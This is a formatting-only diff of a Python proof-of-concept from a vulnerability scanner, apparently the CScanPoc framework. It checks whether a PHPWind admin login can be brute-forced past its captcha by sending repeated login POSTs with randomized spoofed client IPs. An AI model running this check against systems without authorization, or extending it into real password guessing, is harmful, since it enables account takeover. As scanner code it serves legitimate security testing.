@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import random
 import urlparse
 
+
 class Vuln(ABVuln):
-    vuln_id = 'PHPWind_0012' # 平台漏洞编号，留空
+    vuln_id = 'PHPWind_0012'  # 平台漏洞编号，留空
     name = 'PHPWind 后台可爆破'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.OTHER # 漏洞类型
+    type = VulnType.OTHER  # 漏洞类型
     disclosure_date = '2014-10-22'  # 漏洞公布时间
     desc = '''
         PHPWind 后台帐号密码可爆破无视验证码。
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'PHPWind'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '3074078a-7da9-4c05-873a-204843a81d77'
@@ -32,14 +34,16 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #http://www.wooyun.org/bugs/wooyun-2010-080327
+
+            # http://www.wooyun.org/bugs/wooyun-2010-080327
             hh = hackhttp.hackhttp()
             #host = re.findall('http://(.*)/$', self.target)[0]
             host = urlparse.urlparse(self.target).hostname
             t = 0
             for i in range(20):
-                ip = str(random.randint(100,244))+"."+str(random.randint(100,244))+"."+str(random.randint(100,244))+"."+str(random.randint(100,244))
+                ip = str(random.randint(100, 244))+"."+str(random.randint(100, 244)) + \
+                    "."+str(random.randint(100, 244))+"." + \
+                    str(random.randint(100, 244))
                 raw = '''
 POST /windid/admin.php?a=login HTTP/1.1
 Host: %s
@@ -56,11 +60,12 @@ Content-Length: 57
 
 username=1&password=1&submit=&csrf_token=efb7ee93681c6148
                 ''' % (host, ip)
-                code, head, body, errcode, log = hh.http(self.target + '/windid/admin.php?a=login', raw=raw)
+                code, head, body, errcode, log = hh.http(
+                    self.target + '/windid/admin.php?a=login', raw=raw)
                 if '账号或密码错误，请重新登录' in body:
                     t += 1
                 if i > 3 and t == 0:
-                    return 
+                    return
             if t >= 10:
                 #security_warning(url + 'windid/admin.php' + ' : Brute-force cracking');
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -71,6 +76,7 @@ username=1&password=1&submit=&csrf_token=efb7ee93681c6148
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
